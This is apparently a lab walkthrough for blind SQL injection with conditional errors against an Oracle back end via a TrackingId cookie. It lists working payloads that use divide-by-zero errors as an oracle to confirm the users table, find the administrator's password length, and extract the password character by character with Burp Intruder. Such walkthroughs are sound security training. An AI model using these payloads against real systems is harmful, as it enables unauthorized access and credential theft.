## Solution steps

- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
- Let's suppose the TrackingId=xyz
- Modify the TrackingId cookie, appending a single quotation mark to it: TrackingId=xyz'
- Verify that an error message is received.
- Now change it to two quotation marks: TrackingId=xyz''
- Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
- You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax.
- Try submitting: TrackingId=xyz'||(SELECT '')||'
- In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query: TrackingId=xyz'||(SELECT '' FROM dual)||'
- As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
- Try querying a non-existent table name: TrackingId=xyz'||(SELECT '' FROM random-table)||'
- This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
- To verify that the users table exists, send the following query: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
- As this query does not return an error, you can infer that this table does exist. The WHERE ROWNUM = 1 condition is used to prevent the query from returning more than one row, which would break our concatenation.
- You can also exploit this behavior to test conditions. First, submit the following query: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
- Verify that an error message is received.
- Now change it to: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
- Verify that the error disappears.
- This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.
- use the following query to check whether the username administrator exists: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Verify that the condition is true (the error is received), confirming that there is a user called administrator.
- The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Use Burp suite repeater and iterate along the numbers until the condition stops being true.
- The password is 20 characters long as we receive an error at (password)>20
- Send the request to intruder.
- Change the value of the cookie to: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
- Place payload position markers around the final a character in the cookie value.
- In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
- Start the attack.
- The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally.
- Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value.
- Continue this process till 20 as our password length is 20 characters.
- Login as administrator using the password.

Note : While brute-forcing the password, you can use Cluster bomb attack as well, but it will take more time.
